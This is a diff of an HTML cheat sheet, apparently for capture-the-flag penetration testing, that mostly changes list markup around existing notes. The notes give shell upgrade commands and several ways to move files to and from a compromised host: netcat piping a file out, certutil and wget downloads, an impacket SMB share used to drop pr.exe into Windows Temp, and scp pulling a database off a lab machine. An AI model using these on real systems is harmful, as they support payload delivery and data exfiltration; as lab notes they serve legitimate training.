@@ -77,6 +77,7 @@ export SHELL=bash</code> </pre>
             <div class="notion-body">
                 <ul>    
                     <h2> Upgrade terminal </h2>
+                    <p>Other ways of upgrading it can be found <a class="notion-link" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat">here</a></p>
                     <pre><code class="language-python">python -c 'import pty; pty.spawn("/bin/bash")'</code> </pre>
                     <pre><code class="language-python">script /dev/null -c bash</code> </pre>
                     
@@ -90,28 +91,35 @@ export SHELL=bash</code> </pre>
             <div class="notion-body">
                 <ul>
                     <h2>NetCat</h2>
+                    <ul>
                     <p>Where you recieve the file</p>
                     <pre><code class="language-python">nc -l -p 1234 -q 1 > FILE < /dev/null</code> </pre>
                     <p>From where you transfer the file</p>
                     <pre><code class="language-python">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
+                    </ul>    
                 </ul>
 
                 <ul>
                     <h2>CertUtil</h2>
+                    <ul>
                     <p>It's like WGET</p>
                     <pre><code class="language-python">certutil -urlcache -split -f "http://192.168.1.1/resource"</code> </pre>
+                    </ul>    
                 </ul>
 
                 <ul>
 
                 <h2> Python </h2>
+                <ul>
                 <h3>Quickier way</h3>
-                <p>Open Python3 http server</p>
-                <pre><code class="language-python">python3 -m http.server 8080</code> </pre>
-                <p>Acquire the file you want from  the client</p>
-                <pre><code class="language-bash">wget http://10.10.14.10:8080/file.php</code> </pre>
-                
+                    <ul>
+                        <p>Open Python3 http server</p>
+                        <pre><code class="language-python">python3 -m http.server 8080</code> </pre>
+                        <p>Acquire the file you want from  the client</p>
+                        <pre><code class="language-bash">wget http://10.10.14.10:8080/file.php</code> </pre>
+                    </ul>    
                 <h3>Longer way</h3>
+                <ul>
                     <h4> Server </h4>
                     <pre><code class="language-python">python3 -c "
     import socket
@@ -138,21 +146,27 @@ export SHELL=bash</code> </pre>
                 file.write(data)
         print('Archivo recibido con éxito y guardado como archivo_recibido.txt.')"</code></pre>
             </ul>
+            </ul>
+        </ul>
 
             <ul>
                 <h2>SMB</h2>
-                <p>Open smb server</p>
-                <pre><code class="language-python">impacket-smbserver share . </code> </pre>
-                <p>From windows </p>
-                <pre><code class="language-python">copy \\10.10.14.10\SHARE\pr.exe C:\Windows\Temp\pr.exe</code></pre>
+                <ul>
+                    <p>Open smb server</p>
+                    <pre><code class="language-python">impacket-smbserver share . </code> </pre>
+                    <p>From windows </p>
+                    <pre><code class="language-python">copy \\10.10.14.10\SHARE\pr.exe C:\Windows\Temp\pr.exe</code></pre>
+                </ul>
             </ul>
 
             <ul>
                 <h2>SCP</h2>
-                <p>From Kali to Windows</p>
-                <pre><code class="language-bash">scp /ruta/en/kali/archivo.exe Nadine@10.10.10.184:"C:/Users/Nadine/Desktop/archivo.exe"</code> </pre>
-                <p>From Windows to Kali </p>
-                <pre><code class="language-cmd">scp "nadine@10.10.10.184:/C:/RecData/RecordInfoDB.db3" .</code></pre>
+                <ul>
+                    <p>From Kali to Windows</p>
+                    <pre><code class="language-bash">scp /ruta/en/kali/archivo.exe Nadine@10.10.10.184:"C:/Users/Nadine/Desktop/archivo.exe"</code> </pre>
+                    <p>From Windows to Kali </p>
+                    <pre><code class="language-cmd">scp "nadine@10.10.10.184:/C:/RecData/RecordInfoDB.db3" .</code></pre>
+                </ul>
             </ul>
 
             </div>    
